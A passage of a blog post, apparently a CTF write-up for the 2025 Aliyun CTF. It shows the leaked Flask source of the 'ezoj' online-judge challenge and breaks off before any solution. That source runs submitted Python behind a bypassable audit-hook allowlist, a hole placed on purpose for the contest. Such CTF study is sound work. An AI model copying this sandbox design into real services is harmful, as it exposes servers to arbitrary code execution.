@@ -1,0 +1,2171 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="第三届阿里云CTF Writeup">
+<title>Aliyunctf2025[WP]</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/aliyunctf2025wp/'>
+
+<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="Aliyunctf2025[WP]">
+<meta property='og:description' content="第三届阿里云CTF Writeup">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/aliyunctf2025wp/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-02-26T21:17:10&#43;08:00'/><meta property='article:modified_time' content='2025-02-26T21:17:10&#43;08:00'/>
+<meta name="twitter:title" content="Aliyunctf2025[WP]">
+<meta name="twitter:description" content="第三届阿里云CTF Writeup">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">我与我周旋久，宁做我</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#ezoj">ezoj</a></li>
+        <li><a href="#打卡ok">打卡OK</a></li>
+        <li><a href="#jtools">Jtools</a></li>
+        <li><a href="#espresso-coffee">Espresso Coffee</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #2a9d8f; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/aliyunctf2025wp/">Aliyunctf2025[WP]</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            第三届阿里云CTF Writeup
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-02-26</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="web">WEB
+</h1><h3 id="ezoj">ezoj
+</h3><p>啊？怎么整个五个算法题给CTF选手做？？这我不得不展示一下真正的技术把测评机打穿。 题目环境不出网。</p>
+<p>——————</p>
+<p>开题就是几个算法题，在页面下方看到</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502222156053.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250222215656011"
+	
+	
+></p>
+<p>访问source路由拿到源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SUBMISSIONS_PATH</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;./submissions&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROBLEMS_PATH</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;./problems&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SUBMISSIONS_PATH</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CODE_TEMPLATE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import sys
+</span></span></span><span class="line"><span class="cl"><span class="s2">import math
+</span></span></span><span class="line"><span class="cl"><span class="s2">import collections
+</span></span></span><span class="line"><span class="cl"><span class="s2">import queue
+</span></span></span><span class="line"><span class="cl"><span class="s2">import heapq
+</span></span></span><span class="line"><span class="cl"><span class="s2">import bisect
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">def audit_checker(event,args):
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if not event in [&#34;import&#34;,&#34;time.sleep&#34;,&#34;builtins.input&#34;,&#34;builtins.input/result&#34;]:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        raise RuntimeError
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">sys.addaudithook(audit_checker)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">OJTimeLimitExceed</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">OJRuntimeError</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;static/index.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/source&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;server.py&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/api/problems&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list_problems</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">problems_dir</span> <span class="o">=</span> <span class="n">PROBLEMS_PATH</span>
+</span></span><span class="line"><span class="cl">    <span class="n">problems</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">problem</span> <span class="ow">in</span> <span class="n">problems_dir</span><span class="o">.</span><span class="n">iterdir</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">problem_config_file</span> <span class="o">=</span> <span class="n">problem</span> <span class="o">/</span> <span class="s2">&#34;problem.json&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">problem_config_file</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">problem_config</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">problem_config_file</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;r&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">problem</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;problem_id&#34;</span><span class="p">:</span> <span class="n">problem</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">problem_config</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;description&#34;</span><span class="p">:</span> <span class="n">problem_config</span><span class="p">[</span><span class="s2">&#34;description&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">problems</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">problem</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">problems</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">problems</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="s2">&#34;problem_id&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">problems</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;problems&#34;</span><span class="p">:</span> <span class="n">problems</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">problems</span><span class="p">),</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/api/submit&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">submit_code</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;code&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">problem_id</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;problem_id&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">code</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">problem_id</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;ER&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Missing &#39;code&#39; or &#39;problem_id&#39;&#34;</span><span class="p">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="mi">400</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">problem_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">problem_id</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">problem_dir</span> <span class="o">=</span> <span class="n">PROBLEMS_PATH</span> <span class="o">/</span> <span class="n">problem_id</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">problem_dir</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jsonify</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">{</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;ER&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Problem ID </span><span class="si">{</span><span class="n">problem_id</span><span class="si">}</span><span class="s2"> not found!&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="mi">404</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">code_filename</span> <span class="o">=</span> <span class="n">SUBMISSIONS_PATH</span> <span class="o">/</span> <span class="sa">f</span><span class="s2">&#34;submission_</span><span class="si">{</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="si">}</span><span class="s2">.py&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">code_filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">code_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span> <span class="n">CODE_TEMPLATE</span> <span class="o">+</span> <span class="n">code</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">judge</span><span class="p">(</span><span class="n">code_filename</span><span class="p">,</span> <span class="n">problem_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">code_filename</span><span class="o">.</span><span class="n">unlink</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;ER&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">judge</span><span class="p">(</span><span class="n">code_filename</span><span class="p">,</span> <span class="n">problem_dir</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_files</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">problem_dir</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="s2">&#34;*.input&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">total_tests</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">test_files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passed_tests</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">test_file</span> <span class="ow">in</span> <span class="n">test_files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">input_file</span> <span class="o">=</span> <span class="n">test_file</span>
